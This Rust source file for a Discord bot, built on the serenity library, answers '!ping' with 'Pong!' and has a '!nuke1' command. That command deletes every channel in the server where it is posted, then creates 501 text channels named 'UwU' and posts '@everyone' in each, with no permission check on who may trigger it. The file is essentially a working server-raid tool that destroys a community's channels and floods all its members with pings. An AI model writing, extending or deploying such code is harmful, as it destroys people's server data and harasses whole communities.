use serenity::all::ChannelType;
use serenity::async_trait;
use serenity::builder::CreateChannel;
use serenity::model::channel::Message;
use serenity::prelude::*;
use tokio::task;
use tokio::time::{sleep, Duration};


struct Handler;
// Just for testing
// Will Replace with Interface
const TOKEN: &str = "TOKEN-HERE";

#[async_trait]
impl EventHandler for Handler {
    async fn message(&self, ctx: Context, msg: Message) {
        if msg.content == "!ping" {
            if let Err(why) = msg.channel_id.say(&ctx.http, "Pong!").await {
                println!("Error sending message: {why:?}");
            }
        }
        if msg.content == "!nuke1" {
            if let Some(guild_id) = msg.guild_id {
                match guild_id.channels(&ctx.http).await {
                    Ok(channels) => {
                        let delete_channels = {
                            let ctx_clone = ctx.clone();
                            let mut delete_handles = vec![];
                            for channel in channels {
                                let ctx = ctx_clone.clone();
                                let channel_id = channel.0;
                                let handle = task::spawn(async move {
                                    if let Err(why) = channel_id.delete(&ctx.http).await {
                                        println!("Failed to delete channel {}: {:?}", channel_id, why);
                                    } else {
                                        println!("Deleted channel {}", channel_id);
                                    }
                                    sleep(Duration::from_millis(50)).await;
                                });
                                delete_handles.push(handle);
                            }
                            async move {
                                for handle in delete_handles {
                                    let _ = handle.await;
                                }
                            }
                        };
                        delete_channels.await;
                        sleep(Duration::from_secs(1)).await;



                        let create_channels = {
                            let ctx_clone = ctx.clone();
                            let guild_id_clone = guild_id.clone();
                            let mut create_handles = vec![];
                            for _ in 0..501 {
                                sleep(Duration::from_millis(50)).await;
                                let ctx = ctx_clone.clone();
                                let guild_id = guild_id_clone.clone();
                                let handle = task::spawn(async move {
                                    let builder = CreateChannel::new("UwU").kind(ChannelType::Text);
                                    let result = guild_id.create_channel(&ctx.http, builder).await;
                                    match result {
                                        Ok(channel) => {
                                            let new_channel_id = channel.id;
                                            println!("Created channel with ID: {}", new_channel_id);
                                            if let Err(why) = channel.id.say(&ctx.http, "@everyone").await {
                                                print!("Error sending Message: {:?}", why)
                                            }
                                        }
                                        Err(why) => {
                                            println!("Failed to create channel: {:?}", why);
                                        }
                                    }
                                });
                                create_handles.push(handle);

                            }
                            async move {
                                for handle in create_handles {
                                    let _ = handle.await;
                                }
                            }
                        };
                        create_channels.await;
                    }
                    Err(why) => println!("Error fetching channels: {why:?}"),
                }
                        } else {
                println!("Message not sent in a guild");
            }
            println!("\nNuked Successfully!\n")
        }
    }
}

#[tokio::main]
async fn main() {
    // Set gateway intents, which decides what events the bot will be notified about
    let intents = GatewayIntents::GUILD_MESSAGES
        | GatewayIntents::MESSAGE_CONTENT;

    // Create a new instance of the Client, logging in as a bot.
    let mut client = Client::builder(&TOKEN, intents)
        .event_handler(Handler)
        .await
        .expect("Err creating client");

    // Start listening for events by starting a single shard
    if let Err(why) = client.start().await {
        println!("Client error: {why:?}");
    }
}
